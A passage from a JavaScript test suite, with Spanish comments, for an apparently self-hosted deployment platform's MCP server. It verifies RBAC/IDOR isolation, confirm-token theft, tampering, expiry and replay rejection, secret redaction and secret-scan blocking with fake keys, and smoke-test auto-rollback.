        projectId: pid, deploymentId: 'dep_can_1', stableDial: '127.0.0.1:20001', canaryDial: '127.0.0.1:20002',
        weight: 10, stepIndex: 0, steps: [10, 50, 100]
      });
      deployManager.switchCanaryRoute = async (_dep, _hosts, opts) => {
        calledOps.push(`canary_weight:${opts.canaryWeight}`);
        return { ok: true, weights: [100 - opts.canaryWeight, opts.canaryWeight] };
      };
      deployManager.promoteCanary = (pid) => { calledOps.push(`canary_promote:${pid}`); return { ok: true, action: 'promote' }; };

      const restartRes = await mcpServer.executeTool('culkibo_manage_production_service', { projectId: projA.id, action: 'restart' });
      assert.strictEqual(restartRes.isError, false);
      assert.strictEqual(restartRes.structuredContent.restarted, true);
      assert.ok(calledOps.includes(`stop:${projA.id}`) && calledOps.includes(`start:${projA.id}`));

      const docFixAlias = await mcpServer.executeTool('culkibo_system_doctor_fix', { action: 'prune_build_cache' });
      assert.strictEqual(docFixAlias.isError, false);
      assert.ok(calledOps.includes('doctor:prune_buildkit'), 'prune_build_cache debe mapearse a prune_buildkit');

      const canaryAdv = await mcpServer.executeTool('culkibo_canary_rollout', { projectId: projA.id, action: 'advance' });
      assert.strictEqual(canaryAdv.isError, false);
      assert.strictEqual(canaryAdv.structuredContent.nextWeight, 50);
      assert.ok(calledOps.includes('canary_weight:50'));

      // Verificar propiedades reparadas en inputSchema de manage_domain y manage_crons
      assert.ok(mcpServer.getToolByName('culkibo_manage_domain').inputSchema.properties.targetPort);
      assert.ok(mcpServer.getToolByName('culkibo_manage_domain').inputSchema.properties.projectId);
      assert.ok(mcpServer.getToolByName('culkibo_manage_crons').inputSchema.properties.mode);
      assert.ok(mcpServer.getToolByName('culkibo_manage_crons').inputSchema.properties.httpPath);
      assert.ok(mcpServer.getToolByName('culkibo_manage_crons').inputSchema.properties.httpMethod);
    } finally {
      deployManager.stopProduction = origStopProd;
      deployManager.startProduction = origStartProd;
      systemDoctor.applyFix = origApplyFix;
      deployManager.getCanaryState = origGetCanary;
      deployManager.switchCanaryRoute = origSwitchCanary;
      deployManager.promoteCanary = origPromoteCanary;
    }
    console.log('  ✓ 4 handlers reparados verificados (stopProduction/startProduction, prune_buildkit, canary advance, schemas domain/crons)');

    // 5. Regresiones de las 5 fugas RBAC / IDOR cerradas
    const scopedDevA = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_dev_a', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
    };
    const teamViewer = {
      ok: true,
      method: 'session',
      principal: { userId: 'usr_tv', role: 'viewer', teamId: 'team_other', projectIds: null, scopes: ['*'] }
    };

    const origListContainers = dockerManager.listContainers;
    const origGetCandidates = sleepAdvisor.getSleepCandidates;
    const origAnalyzeRes = sleepAdvisor.analyzeResources;
    const origListMons = uptimeMonitor.listMonitors;
    const origListPages = uptimeMonitor.listStatusPages;
    let observedAnalyzeProjectIds = null;
    try {
      // 5a. docker_containers: sin projectId en el contenedor, team_other no ve nada y scopedDevA solo ve su contenedor
      dockerManager.listContainers = async () => [
        { id: 'c_a', names: [`culkibo_${projA.id}_live`], image: 'app:a', state: 'running' },
        { id: 'c_b', names: [`culkibo_${projB.id}_live`], image: 'app:b', state: 'running' },
        { id: 'c_sys', names: ['unrelated_host_container'], image: 'sys:1', state: 'running' }
      ];
      const devContainers = await mcpServer.executeTool('culkibo_docker_containers', {}, { auth: scopedDevA });
      assert.strictEqual(devContainers.isError, false);
      assert.deepStrictEqual(devContainers.structuredContent.containers.map((c) => c.id), ['c_a']);
      const otherTeamContainers = await mcpServer.executeTool('culkibo_docker_containers', {}, { auth: teamViewer });
      assert.strictEqual(otherTeamContainers.isError, false);
      assert.strictEqual(otherTeamContainers.structuredContent.containers.length, 0, 'team_other no debe ver contenedores de otro equipo ni sin propietario');

      // 5b. sleep_status: candidates filtrado por projectIds
      sleepAdvisor.getSleepCandidates = (opts) => [
        { projectId: projA.id, idleMinutes: 30 },
        { projectId: projB.id, idleMinutes: 45 }
      ].filter((c) => !Array.isArray(opts?.projectIds) || opts.projectIds.includes(c.projectId));
      const sleepScoped = await mcpServer.executeTool('culkibo_sleep_status', {}, { auth: scopedDevA });
      assert.strictEqual(sleepScoped.isError, false);
      assert.deepStrictEqual(sleepScoped.structuredContent.candidates.map((c) => c.projectId), [projA.id]);

      // 5c. cost_advisor: pasa projectIds al advisor
      sleepAdvisor.analyzeResources = async (opts) => {
        observedAnalyzeProjectIds = opts?.projectIds || null;
        return { summary: { freeMemPct: 45 }, recommendations: [], reclaimableRamMb: 0, estimatedMonthlySavingsEur: 0 };
      };
      const advScoped = await mcpServer.executeTool('culkibo_cost_advisor', {}, { auth: scopedDevA });
      assert.strictEqual(advScoped.isError, false);
      assert.deepStrictEqual(observedAnalyzeProjectIds, [projA.id]);

      // 5d. uptime_list_monitors y culkibo://uptime: statusPages filtradas por monitores permitidos
      uptimeMonitor.listMonitors = () => [
        { id: 'mon_a', projectId: projA.id, name: 'Mon A', status: 'up' },
        { id: 'mon_b', projectId: projB.id, name: 'Mon B', status: 'down' }
      ];
      uptimeMonitor.listStatusPages = () => [
        { slug: 'page-a', title: 'Page A', monitorIds: ['mon_a'] },
        { slug: 'page-b', title: 'Page B', monitorIds: ['mon_b'] },
        { slug: 'page-mix', title: 'Page Mix', monitorIds: ['mon_a', 'mon_b'] }
      ];
      const upScoped = await mcpServer.executeTool('culkibo_uptime_list_monitors', {}, { auth: scopedDevA });
      assert.strictEqual(upScoped.isError, false);
      assert.deepStrictEqual(upScoped.structuredContent.statusPages.map((p) => p.slug), ['page-a']);
      const upResScoped = await mcpServer.readResource('culkibo://uptime', { auth: scopedDevA });
      const upResParsed = JSON.parse(upResScoped.contents[0].text);
      assert.deepStrictEqual(upResParsed.statusPages.map((p) => p.slug), ['page-a']);

      // 5e. gitops_plan con prune: true no filtra projB a scopedDevA
      const gitopsPlan = await mcpServer.executeTool('culkibo_gitops_plan', {
        yamlText: 'version: 1\nname: scoped-check\nprojects: []\n',
        prune: true
      }, { auth: scopedDevA });
      assert.strictEqual(gitopsPlan.isError, false);
      const delSerialized = JSON.stringify(gitopsPlan.structuredContent.delete || []);
      assert.ok(!delSerialized.includes(projB.id) && !delSerialized.includes(projB.name), 'gitops_plan prune NO debe revelar proyectos ajenos');
    } finally {
      dockerManager.listContainers = origListContainers;
      sleepAdvisor.getSleepCandidates = origGetCandidates;
      sleepAdvisor.analyzeResources = origAnalyzeRes;
      uptimeMonitor.listMonitors = origListMons;
      uptimeMonitor.listStatusPages = origListPages;
    }
    console.log('  ✓ 5 fugas RBAC/IDOR cerradas verificadas (docker_containers, sleep_status, cost_advisor, uptime/statusPages, gitops_plan)');

    // 6. Autocuración Autónoma: culkibo_diagnose_incident + culkibo_auto_remediate (dryRun + confirmToken + replay + expiry)
    const origStatus = deployManager.status;
    const origRuntimeStats = deployManager.getRuntimeStats;
    const origRuntimeLogs = deployManager.getRuntimeLogs;
    const origListDeps = deployManager.listDeployments;
    const origRunDoctor = systemDoctor.runDoctor;
    const origUmList = uptimeMonitor.listMonitors;
    const origUmInc = uptimeMonitor.listIncidents;
    const origReconcile = ingressManager.reconcile;
    try {
      deployManager.status = async () => ({
        current: { id: 'dep_bad', containerName: `culkibo_${projA.id}_live`, status: 'error' },
        previous: { id: 'dep_good', containerName: `culkibo_${projA.id}_prev`, status: 'activo' }
      });
      deployManager.getRuntimeStats = async () => ({
        ok: true, running: false, status: 'exited', oomKilled: true, restartCount: 4, health: 'unhealthy', containerName: `culkibo_${projA.id}_live`
      });
      deployManager.getRuntimeLogs = async () => ({
        lines: ['INFO starting server', 'FATAL JavaScript heap out of memory (ENOMEM)', 'ERROR ECONNREFUSED 127.0.0.1:5432']
      });
      deployManager.listDeployments = () => [{ id: 'dep_bad', status: 'error', stage: 'healthcheck', commit: 'abc12345', error: 'OOM killed', logLines: [] }];
      systemDoctor.runDoctor = async () => ({ summary: { ok: 6, warn: 1, fail: 0 }, checks: [{ name: 'BuildKit', status: 'warn', summary: 'cache high', fixAction: 'prune_buildkit' }] });
      uptimeMonitor.listMonitors = () => [{ id: 'mon_a1', projectId: projA.id, name: 'API Health', status: 'down' }];
      uptimeMonitor.listIncidents = () => [{ id: 'inc_1', projectId: projA.id, status: 'open' }];
      ingressManager.reconcile = async () => ({ ok: true, reconciled: true });

      const diag = await mcpServer.executeTool('culkibo_diagnose_incident', { projectId: projA.id }, { auth: scopedDevA });
      assert.strictEqual(diag.isError, false);
      const d = diag.structuredContent;
      assert.strictEqual(d.severity, 'critical');
      const causeCodes = d.rootCauses.map((r) => r.code);
      assert.ok(causeCodes.includes('CONTAINER_OOM_KILLED'), 'Debe detectar CONTAINER_OOM_KILLED');
      assert.ok(causeCodes.includes('CONTAINER_CRASH_LOOP'), 'Debe detectar CONTAINER_CRASH_LOOP');
      assert.ok(causeCodes.includes('RECENT_DEPLOY_FAILED'), 'Debe detectar RECENT_DEPLOY_FAILED');
      assert.ok(causeCodes.includes('UPTIME_MONITOR_DOWN'), 'Debe detectar UPTIME_MONITOR_DOWN');
      assert.ok(d.remediationPlan.some((p) => p.tool === 'culkibo_auto_remediate' && p.action === 'rollback_release' && p.args.dryRun === true));

      // 6a. Ejecutar culkibo_auto_remediate SIN confirmToken -> CONFIRMATION_REQUIRED (0 mutaciones)
      const noTok = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: true
      }, { auth: scopedDevA });
      assert.strictEqual(noTok.isError, true);
      assert.strictEqual(JSON.parse(noTok.content[0].text).code, 'CONFIRMATION_REQUIRED');
      assert.strictEqual(projectManager.getById(projA.id).maintenanceMode, false);

      // 6b. Acción global (doctor_fix) bloqueada con FORBIDDEN para developer / token por proyecto
      const globalBlocked = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'doctor_fix',
        doctorFixAction: 'clean_tmp',
        dryRun: true
      }, { auth: scopedDevA });
      assert.strictEqual(globalBlocked.isError, true);
      assert.strictEqual(JSON.parse(globalBlocked.content[0].text).code, 'FORBIDDEN');

      // 6c. Fase 1 dryRun: true emite confirmToken HMAC-SHA256 y lo redacta de la auditoría
      const dryRem = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: true,
        dryRun: true
      }, { auth: scopedDevA });
      assert.strictEqual(dryRem.isError, false);
      assert.strictEqual(dryRem.structuredContent.dryRun, true);
      assert.strictEqual(dryRem.structuredContent.wouldExecute, true);
      const token = dryRem.structuredContent.confirmToken;
      assert.ok(typeof token === 'string' && token.startsWith('ckr_'), 'Debe emitir confirmToken ckr_...');
      assert.strictEqual(projectManager.getById(projA.id).maintenanceMode, false, 'dryRun NUNCA muta estado');
      const auditLatest = mcpServer.getAuditLog(1)[0];
      assert.ok(!JSON.stringify(auditLatest).includes(token), 'confirmToken NUNCA debe quedar en claro en auditLog');

      // 6d. Robo de token por otro principal -> CONFIRM_TOKEN_MISMATCH
      const otherDevA = {
        ok: true,
        method: 'api_token',
        principal: { userId: 'usr_dev_other', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
      };
      const stolenTok = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: true,
        confirmToken: token
      }, { auth: otherDevA });
      assert.strictEqual(stolenTok.isError, true);
      assert.strictEqual(JSON.parse(stolenTok.content[0].text).code, 'CONFIRM_TOKEN_MISMATCH');

      // 6e. Alteración de parámetros -> CONFIRM_TOKEN_MISMATCH
      const tamperedParams = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: false,
        confirmToken: token
      }, { auth: scopedDevA });
      assert.strictEqual(tamperedParams.isError, true);
      assert.strictEqual(JSON.parse(tamperedParams.content[0].text).code, 'CONFIRM_TOKEN_MISMATCH');

      // 6f. Token caducado -> CONFIRM_TOKEN_EXPIRED
      const expiredMint = mcpServer.mintRemediationToken(
        mcpServer.normalizePrincipal(scopedDevA),
        { action: 'toggle_maintenance', projectId: projA.id, maintenanceEnabled: true },
        10
      );
      await new Promise((r) => setTimeout(r, 25));
      const expRes = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: true,
        confirmToken: expiredMint.confirmToken
      }, { auth: scopedDevA });
      assert.strictEqual(expRes.isError, true);
      const expCode = JSON.parse(expRes.content[0].text).code;
      assert.ok(expCode === 'CONFIRM_TOKEN_EXPIRED' || expCode === 'CONFIRM_TOKEN_INVALID');

      // 6g. Ejecución legítima con confirmToken válido -> aplica y devuelve postVerification
      const execRem = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: true,
        confirmToken: token
      }, { auth: scopedDevA });
      assert.strictEqual(execRem.isError, false);
      assert.strictEqual(execRem.structuredContent.executed, true);
      assert.ok(execRem.structuredContent.postVerification);
      assert.strictEqual(projectManager.getById(projA.id).maintenanceMode, true);

      // 6h. Replay con el mismo token ya consumido -> CONFIRM_TOKEN_REPLAYED
      const replayRes = await mcpServer.executeTool('culkibo_auto_remediate', {
        action: 'toggle_maintenance',
        projectId: projA.id,
        maintenanceEnabled: true,
        confirmToken: token
      }, { auth: scopedDevA });
      assert.strictEqual(replayRes.isError, true);
      assert.strictEqual(JSON.parse(replayRes.content[0].text).code, 'CONFIRM_TOKEN_REPLAYED');
    } finally {
      deployManager.status = origStatus;
      deployManager.getRuntimeStats = origRuntimeStats;
      deployManager.getRuntimeLogs = origRuntimeLogs;
      deployManager.listDeployments = origListDeps;
      systemDoctor.runDoctor = origRunDoctor;
      uptimeMonitor.listMonitors = origUmList;
      uptimeMonitor.listIncidents = origUmInc;
      ingressManager.reconcile = origReconcile;
    }
    console.log('  ✓ Autocuración autónoma verificada (diagnose_incident + auto_remediate dryRun/confirmToken/mismatch/expiry/exec/replay)');
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
  }
}

/**
 * MCP 2026 Pioneer:
 *  - 8 playbooks interactivos (prompts/list + prompts/get + sanitización + fail-closed RBAC)
 *  - culkibo_ship_and_verify (pre-flight secret scan, confirmToken HMAC-SHA256, smoke check, auto-rollback, anti-IDOR)
 *  - culkibo_export_agent_kit (6 agentes drop-in, ?profile=core, ${CULKIBO_TOKEN} sin fugas de secretos)
 *  - X-Culkibo-Mcp-Profile header fallback en Streamable HTTP
 */
async function testMcp2026PioneerUpgrades() {
  const express = require('express');
  const projectManager = require('../server/services/projectManager');
  const deployManager = require('../server/services/deployManager');
  const mcpStreamableHttp = require('../server/services/mcpStreamableHttp');
  const V = mcpServer.protocol.PROTOCOL_VERSION;

  // 1. Verificar los 8 battle-tested playbooks vía handleModernRpc y handleJsonRpc + redacción de secretos en args
  const expectedPlaybooks = [
    ['deploy_safely', { projectId: 'proj_ship_1', targetEnv: 'production' }, 'culkibo_ship_and_verify'],
    ['migrate_from_coolify', { coolifyUrl: 'https://coolify.acme.dev' }, 'SERVICE_FQDN_'],
    ['debug_production_crash', { projectId: 'proj_crash_1', hostname: 'api.acme.dev' }, 'culkibo_diagnose_incident'],
    ['zero_downtime_db_upgrade', { databaseId: 'db_pg_main', targetVersion: 'postgres:17' }, 'culkibo_database_backup'],
    ['security_audit_stack', { scope: 'instance' }, '/api/audit/verify'],
    ['setup_wildcard_tls_and_tunnel', { rootDomain: 'acme.dev', mode: 'dns01' }, 'culkibo_manage_wildcard_dns01'],
    ['optimize_ram_and_costs', { monthlyServerCostEur: '25' }, 'culkibo_cost_advisor'],
    ['disaster_recovery_drill', { databaseId: 'db_pg_main', projectId: 'proj_dr_1' }, 'AES-256-GCM']
  ];

  const listModern = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'pb-list-1',
    method: 'prompts/list',
    params: { _meta: { 'io.modelcontextprotocol/protocolVersion': V, 'io.modelcontextprotocol/clientCapabilities': {} } }
  });
  assert.strictEqual(listModern.result.prompts.length, 13);

  for (const [pbName, pbArgs, expectedNeedle] of expectedPlaybooks) {
    assert.ok(listModern.result.prompts.some((p) => p.name === pbName), `prompts/list debe incluir ${pbName}`);
    const got = await mcpServer.handleModernRpc({
      jsonrpc: '2.0',
      id: `pb-get-${pbName}`,
      method: 'prompts/get',
      params: {
        name: pbName,
        arguments: pbArgs,
        _meta: { 'io.modelcontextprotocol/protocolVersion': V, 'io.modelcontextprotocol/clientCapabilities': {} }
      }
    });
    assert.ok(got.result && Array.isArray(got.result.messages) && got.result.messages.length >= 1, `prompts/get falló para ${pbName}`);
    const text = got.result.messages[0].content.text;
    assert.ok(text.includes(expectedNeedle), `Playbook ${pbName} debe mencionar '${expectedNeedle}'`);
  }

  // Redacción de secretos si alguien pasa un secreto en los args de un prompt
  const secretArgPrompt = mcpServer.getPrompt('deploy_safely', { projectId: 'sk_live_never_echo_secret_12345678' });
  assert.ok(!secretArgPrompt.messages[0].content.text.includes('sk_live_never_echo_secret_12345678'), 'prompts/get NUNCA debe reflejar secretos');
  assert.ok(secretArgPrompt.messages[0].content.text.includes('[REDACTED]'));

  // Credencial revocada ({ ok: false }) falla cerrado en prompts/list y prompts/get
  const deniedAuth = { ok: false };
  assert.strictEqual(mcpServer.listPrompts(deniedAuth).length, 0);
  assert.throws(() => mcpServer.getPrompt('deploy_safely', {}, { auth: deniedAuth }), /Acceso denegado/);
  console.log('  ✓ MCP 2026: 8 playbooks interactivos verificados (prompts/list, prompts/get, redacción y RBAC fail-closed)');

  // 2. culkibo_export_agent_kit (6 agentes drop-in, ?profile=core, cero secretos en claro)
  const prevEnvToken = process.env.CULKIBO_TOKEN;
  process.env.CULKIBO_TOKEN = 'ck_master_super_secret_never_embed_999';
  try {
    const viewerAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_kit_viewer', role: 'viewer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
    };
    const kitRes = await mcpServer.executeTool('culkibo_export_agent_kit', {
      target: 'all',
      serverUrl: 'https://panel.acme.dev'
    }, { auth: viewerAuth });
    assert.strictEqual(kitRes.isError, false);
    const kit = kitRes.structuredContent;
    assert.strictEqual(kit.profile, 'core', 'culkibo_export_agent_kit debe usar profile=core por defecto');
    assert.strictEqual(kit.endpoint, 'https://panel.acme.dev/api/mcp?profile=core');
    assert.strictEqual(kit.tokenPlaceholder, '${CULKIBO_TOKEN}');
    assert.strictEqual(kit.containsPlaintextSecrets, false);
    assert.ok(kit.tokenSavings.savedPct >= 80, `El perfil core debe ahorrar >=80% (logró ${kit.tokenSavings.savedPct}%)`);
    for (const targetKey of ['antigravity', 'claude-code', 'cursor', 'windsurf', 'codex', 'vscode']) {
      assert.ok(kit.kits[targetKey], `Falta kit para ${targetKey}`);
      assert.ok(Array.isArray(kit.kits[targetKey].files) && kit.kits[targetKey].files.length >= 1);
    }
    assert.ok(kit.kits['claude-code'].files.some((f) => f.path === '.mcp.json'));
    assert.ok(kit.kits['claude-code'].files.some((f) => f.path === 'CLAUDE.md'));
    assert.ok(kit.kits.cursor.files.some((f) => f.path === '.cursor/mcp.json'));
    assert.ok(kit.kits.codex.files.some((f) => f.path === '.codex/config.toml' && f.content.includes('bearer_token_env_var = "CULKIBO_TOKEN"')));
    const serializedKit = JSON.stringify(kit);
    assert.ok(!serializedKit.includes('ck_master_super_secret_never_embed_999'), 'Agent kit JAMÁS puede incrustar CULKIBO_TOKEN real');
    assert.ok(serializedKit.includes('${CULKIBO_TOKEN}'), 'Agent kit debe usar placeholder ${CULKIBO_TOKEN}');
    console.log(`  ✓ culkibo_export_agent_kit verificado (6 agentes, ?profile=core -${kit.tokenSavings.savedPct}%, 0 secretos en claro)`);
  } finally {
    if (prevEnvToken === undefined) delete process.env.CULKIBO_TOKEN;
    else process.env.CULKIBO_TOKEN = prevEnvToken;
  }

  // 3. culkibo_ship_and_verify (pre-flight secret scan + 2-phase confirmToken + smoke verify + auto-rollback + RBAC)
  const leakyProj = projectManager.create({
    name: 'Ship Leaky App',
    description: 'Has hardcoded secret',
    envVars: {
      NODE_ENV: 'production',
      STRIPE_SECRET_KEY: 'sk_live_hardcoded_leak_1234567890abcdef'
    },
    teamId: 'team_default'
  });
  const cleanProj = projectManager.create({
    name: 'Ship Clean App',
    description: 'Vault-clean app',
    envVars: {
      NODE_ENV: 'production',
      STRIPE_SECRET_KEY: '${vault.STRIPE_SECRET_KEY}'
    },
    smokeTests: { enabled: true, failPolicy: 'rollback', checks: [{ path: '/health', expectedStatus: 200 }] },
    teamId: 'team_default'
  });

  const devScopedClean = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_ship_dev', role: 'developer', teamId: 'team_default', projectIds: [cleanProj.id], scopes: ['*'] }
  };

  const origDeploy = deployManager.deploy;
  const origStatus = deployManager.status;
  const origSmoke = deployManager.runSmokeTests;
  const origRollback = deployManager.rollback;
  const origStats = deployManager.getRuntimeStats;
  try {
    // 3a. Anti-IDOR: developer acotado a cleanProj NO puede usar ship_and_verify sobre leakyProj ni con dryRun
    const idorShip = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: leakyProj.id,
      dryRun: true
    }, { auth: devScopedClean });
    assert.strictEqual(idorShip.isError, true);
    assert.strictEqual(JSON.parse(idorShip.content[0].text).code, 'FORBIDDEN');

    // 3b. Developer NO puede degradar secretScanMode a 'warn'
    const warnBlocked = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      secretScanMode: 'warn',
      dryRun: true
    }, { auth: devScopedClean });
    assert.strictEqual(warnBlocked.isError, true);
    assert.strictEqual(JSON.parse(warnBlocked.content[0].text).code, 'FORBIDDEN');

    // 3c. Proyecto con secreto hardcoded -> dryRun: true bloquea con SECRET_LEAK_DETECTED y NO emite confirmToken ni filtra el secreto
    deployManager.status = async () => ({ current: { id: 'dep_prev_1', hostPort: 20101 }, previous: null });
    const dryLeaky = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: leakyProj.id,
      dryRun: true
    });
    assert.strictEqual(dryLeaky.isError, false);
    assert.strictEqual(dryLeaky.structuredContent.wouldExecute, false);
    assert.strictEqual(dryLeaky.structuredContent.secretScan.blocked, true);
    assert.ok(dryLeaky.structuredContent.blockers.includes('SECRET_LEAK_DETECTED'));
    assert.strictEqual(dryLeaky.structuredContent.confirmToken, undefined, 'No debe emitir confirmToken cuando hay fugas bloqueantes');
    assert.ok(!JSON.stringify(dryLeaky).includes('sk_live_hardcoded_leak_1234567890abcdef'), 'El reporte de secret scan jamás expone el secreto en claro');

    // 3d. dryRun: false sin confirmToken -> CONFIRMATION_REQUIRED
    const noShipTok = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      dryRun: false
    }, { auth: devScopedClean });
    assert.strictEqual(noShipTok.isError, true);
    assert.strictEqual(JSON.parse(noShipTok.content[0].text).code, 'CONFIRMATION_REQUIRED');

    // 3e. Proyecto limpio -> Fase 1 dryRun: true emite confirmToken ckr_ (redactado del auditLog)
    const dryClean = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      dryRun: true
    }, { auth: devScopedClean });
    assert.strictEqual(dryClean.isError, false);
    assert.strictEqual(dryClean.structuredContent.wouldExecute, true);
    assert.strictEqual(dryClean.structuredContent.secretScan.clean, true);
    assert.strictEqual(dryClean.structuredContent.rollbackReadiness.canRollback, true);
    const shipToken = dryClean.structuredContent.confirmToken;
    assert.ok(typeof shipToken === 'string' && shipToken.startsWith('ckr_'));
    const latestShipAudit = mcpServer.getAuditLog(1)[0];
    assert.ok(!JSON.stringify(latestShipAudit).includes(shipToken), 'confirmToken de ship_and_verify jamás debe aparecer en auditLog');

    // 3f. Cross-tool confusion: el token de ship_and_verify NO funciona en culkibo_auto_remediate
    const crossTool = await mcpServer.executeTool('culkibo_auto_remediate', {
      action: 'restart_service',
      projectId: cleanProj.id,
      confirmToken: shipToken
    }, { auth: devScopedClean });
    assert.strictEqual(crossTool.isError, true);
    assert.strictEqual(JSON.parse(crossTool.content[0].text).code, 'CONFIRM_TOKEN_MISMATCH');

    // 3g. Fase 2 exitosa: deploy + smoke tests OK + metricsSnapshot
    let rollbackCalls = 0;
    deployManager.deploy = async (proj) => ({ id: 'dep_ship_ok', projectId: proj.id, status: 'activo', hostPort: 20102 });
    deployManager.runSmokeTests = async () => ({ passed: true, ok: true, results: [{ path: '/health', status: 200, ok: true, latencyMs: 11 }] });
    deployManager.rollback = async (pid) => { rollbackCalls++; return { id: 'dep_prev_1', projectId: pid, status: 'activo' }; };
    deployManager.getRuntimeStats = async () => ({ ok: true, running: true, status: 'running', health: 'healthy' });

    const shippedOk = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      dryRun: false,
      confirmToken: shipToken
    }, { auth: devScopedClean });
    assert.strictEqual(shippedOk.isError, false);
    assert.strictEqual(shippedOk.structuredContent.phase, 'shipped_verified');
    assert.strictEqual(shippedOk.structuredContent.verified, true);
    assert.strictEqual(shippedOk.structuredContent.rollbackExecuted, false);
    assert.strictEqual(shippedOk.structuredContent.smokeVerification.passed, true);
    assert.ok(shippedOk.structuredContent.metricsSnapshot);
    assert.strictEqual(rollbackCalls, 0);

    // Replay del mismo token -> CONFIRM_TOKEN_REPLAYED
    const replayShip = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      dryRun: false,
      confirmToken: shipToken
    }, { auth: devScopedClean });
    assert.strictEqual(replayShip.isError, true);
    assert.strictEqual(JSON.parse(replayShip.content[0].text).code, 'CONFIRM_TOKEN_REPLAYED');

    // 3h. Auto-rollback cuando fallan los smoke checks post-despliegue
    const dryClean2 = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      dryRun: true
    }, { auth: devScopedClean });
    const shipToken2 = dryClean2.structuredContent.confirmToken;
    deployManager.runSmokeTests = async () => ({ passed: false, ok: false, results: [{ path: '/health', status: 503, ok: false }] });

    const shippedRb = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: cleanProj.id,
      dryRun: false,
      confirmToken: shipToken2
    }, { auth: devScopedClean });
    assert.strictEqual(shippedRb.isError, false);
    assert.strictEqual(shippedRb.structuredContent.phase, 'shipped_rolled_back');
    assert.strictEqual(shippedRb.structuredContent.verified, false);
    assert.strictEqual(shippedRb.structuredContent.rollbackExecuted, true);
    assert.strictEqual(rollbackCalls, 1);
    console.log('  ✓ culkibo_ship_and_verify verificado (secret scan block, confirmToken HMAC/replay/cross-tool, smoke verify, auto-rollback, anti-IDOR)');
  } finally {
    deployManager.deploy = origDeploy;
    deployManager.status = origStatus;
    deployManager.runSmokeTests = origSmoke;
    deployManager.rollback = origRollback;
    deployManager.getRuntimeStats = origStats;
    projectManager.delete(leakyProj.id);
    projectManager.delete(cleanProj.id);
    await projectManager.flushToDisk();
  }

  // 4. X-Culkibo-Mcp-Profile header fallback en Streamable HTTP
  const app = express();
  app.use(express.json());
  app.post('/api/mcp', mcpStreamableHttp.handlePost);
  const srv = await new Promise((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  try {
    const hdrRes = await fetch(`http://127.0.0.1:${srv.address().port}/api/mcp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'MCP-Protocol-Version': V,
        'Mcp-Method': 'tools/list',
        'X-Culkibo-Mcp-Profile': 'core'
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 'hdr-prof-1',
        method: 'tools/list',
        params: { _meta: { 'io.modelcontextprotocol/protocolVersion': V, 'io.modelcontextprotocol/clientCapabilities': {} } }
      })
    });
    assert.strictEqual(hdrRes.status, 200);
    assert.strictEqual(hdrRes.headers.get('x-culkibo-mcp-profile'), 'core');
    assert.ok(String(hdrRes.headers.get('vary') || '').includes('X-Culkibo-Mcp-Profile'));
    const hdrBody = await hdrRes.json();
    assert.strictEqual(hdrBody.result.profile, 'core');
    assert.ok(hdrBody.result.tools.some((t) => t.name === 'culkibo_ship_and_verify'));
    console.log('  ✓ Streamable HTTP X-Culkibo-Mcp-Profile header fallback y Vary verificados');
  } finally {
    await new Promise((resolve) => srv.close(resolve));
  }
}

/**
 * MCP 2026 Cycle-2:
 *  - World-First PaaS MCP Apps (`ui://culkibo/*`, ext-apps 2026-01-26, MIME, strict CSP, 0 external URLs, XSS escaping, postMessage bridge, RBAC)
 *  - `_meta.ui.resourceUri` linkage on tools & tool results
 *  - `culkibo_smartpack_plan` (RO, outputSchema, path-boundary guard, real SmartPack plan)
 *  - `culkibo_edge_tunnel` (admin RBAC, dryRun preview, create/list/status/revoke, cket_ redaction in auditLog)
 */
async function testMcp2026Cycle2AppsAndTools() {
  const express = require('express');
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const mcpStreamableHttp = require('../server/services/mcpStreamableHttp');
  const mcpAppsRenderer = require('../server/services/mcpAppsRenderer');
  const V = mcpServer.protocol.PROTOCOL_VERSION;

  // 1. Capabilities extension advertised in discover & initialize
  const discover = mcpServer.getDiscoverResult();
  assert.ok(discover.capabilities.extensions && discover.capabilities.extensions['io.modelcontextprotocol/ui']);
  assert.ok(discover.capabilities.extensions['io.modelcontextprotocol/ui'].mimeTypes.includes('text/html;profile=mcp-app'));

  const initRes = await mcpServer.handleJsonRpc({ jsonrpc: '2.0', id: 'ext-init', method: 'initialize', params: {} });
  assert.ok(initRes.result.capabilities.extensions['io.modelcontextprotocol/ui'].mimeTypes.includes('text/html;profile=mcp-app'));

  // 2. _meta.ui attached to key tools
